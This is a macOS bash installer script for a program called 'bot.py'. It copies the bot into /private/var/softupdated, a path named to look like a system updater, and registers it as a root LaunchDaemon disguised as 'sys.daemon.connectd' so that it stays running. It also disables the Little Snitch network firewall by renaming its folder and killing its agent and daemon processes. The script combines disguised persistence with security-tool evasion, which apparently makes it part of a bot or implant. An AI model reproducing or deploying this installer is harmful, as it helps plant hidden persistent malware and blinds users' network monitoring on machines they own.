#!/bin/bash

echo [+] Starting: `date`

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$DIR"

### unload previous install
pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
kill -KILL $pid > /dev/null 2>&1

launchctl unload -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [X] Unloaded Bot.

pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
kill -KILL $pid > /dev/null 2>&1

### copy libraries and binaries to corresponding locations
mkdir -p /private/var/softupdated
cp -fR ./* /private/var/softupdated/
chmod -R +x /private/var/softupdated

rm -f /private/var/softupdated/README.md
rm -Rf /private/var/softupdated/applet.rsrc
rm -f /private/var/softupdated/*.icns
rm -f /private/var/softupdated/*.sublime*
rm -f /private/var/softupdated/description.rtfd

### Disable little snitch
if [ -e "/Library/Little Snitch" ] 
	then
	mv "/Library/Little Snitch" "/Library/Little Snitch Monitor"
	killall "Little Snitch Agent"
	killall "Little Snitch Daemon"
	killall "Little Snitch Network Monitor"
fi

### copy launchd scripts to launchd folder
cp -f ./sys.daemon.connectd.plist /Library/LaunchDaemons/sys.daemon.connectd.plist
chown -R root /Library/LaunchDaemons/sys.daemon.connectd.plist
chmod -R 644 /Library/LaunchDaemons/sys.daemon.connectd.plist

### For in-place updates
rm -Rf /private/var/softupdated/code && echo "[+] Removed downloaded source folder."
chmod -R 700 /private/var/softupdated

### load launchd keepalive processes
launchctl load -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [√] Loaded Bot.

echo [+] FINISHED: `date`

exit 0